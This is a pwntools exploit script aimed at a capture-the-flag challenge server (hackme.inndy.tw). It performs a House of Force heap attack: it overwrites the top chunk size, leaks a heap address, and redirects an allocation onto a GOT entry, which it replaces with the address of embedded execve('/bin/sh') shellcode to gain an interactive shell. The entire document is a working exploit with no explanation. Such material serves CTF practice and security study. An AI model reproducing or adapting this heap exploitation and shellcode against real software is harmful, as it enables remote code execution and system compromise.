from pwn import *
context(log_level = "debug", arch = "i386", terminal = ["deepin-terminal", "-x", "sh", "-c"])
t = remote('hackme.inndy.tw', 7721)
#t = remote('192.168.5.148', 9999)

def write_m(length, title, content):
	t.sendlineafter('Action: ', '1')
	t.sendlineafter('Content Length: ', str(length))
	t.sendlineafter('Title: ', title)
	t.sendlineafter('Content: ', content)


def dump():
	t.sendlineafter('Action: ', '2')


sc = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
payload = cyclic(36) + p32(0xffffffff)
write_m(30,'a' * 65,sc)
write_m(30,'123',payload)
#raw_input()
dump()
t.recvuntil('123')
addr_heap = u32(t.recvuntil('123')[-7:-3])
log.info(hex(addr_heap))
addr_top = addr_heap + 0xd8
malloc_size = 0x0804a00c - addr_top - 0x8 - 0x8 - 0x4
addr_sc = addr_heap + 0x48
log.info(hex(addr_sc))
#raw_input()
write_m(malloc_size - 72,'123','123')
t.sendlineafter('Action: ','1')
t.sendlineafter('Length: ','30')
t.sendlineafter('Title: ', p32(addr_sc))

t.interactive()